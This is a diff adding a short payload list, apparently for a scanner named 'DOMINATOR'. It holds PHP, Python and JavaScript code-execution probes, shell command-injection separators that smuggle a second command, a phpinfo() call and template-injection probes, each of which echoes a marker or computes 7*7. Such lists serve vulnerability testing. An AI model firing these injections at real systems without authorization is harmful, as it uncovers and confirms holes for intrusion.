@@ -1,0 +1,23 @@
+<?php echo 'DOMINATOR_PHP_EXEC_TEST'; ?>
+<?php system('echo DOMINATOR_PHP_SYSTEM'); ?>
+<?php exec('echo DOMINATOR_PHP_EXEC'); ?>
+<?php passthru('echo DOMINATOR_PHP_PASSTHRU'); ?>
+<?php shell_exec('echo DOMINATOR_PHP_SHELL'); ?>
+<?php `echo DOMINATOR_PHP_BACKTICK`; ?>
+<?php eval('echo "DOMINATOR_PHP_EVAL";'); ?>
+<?php phpinfo(); ?>
+__import__('os').system('echo DOMINATOR_PYTHON_EXEC')
+exec('print("DOMINATOR_PYTHON_EXEC")')
+eval('print("DOMINATOR_PYTHON_EVAL")')
+eval('alert("DOMINATOR_JS_EVAL")')
+Function('alert("DOMINATOR_JS_FUNCTION")')();
+; echo DOMINATOR_CMD_EXEC
+| echo DOMINATOR_CMD_EXEC
+& echo DOMINATOR_CMD_EXEC
+&& echo DOMINATOR_CMD_EXEC
+|| echo DOMINATOR_CMD_EXEC
+`echo DOMINATOR_CMD_EXEC`
+$(echo DOMINATOR_CMD_EXEC)
+{{7*7}}
+${7*7}
+<%=7*7%>
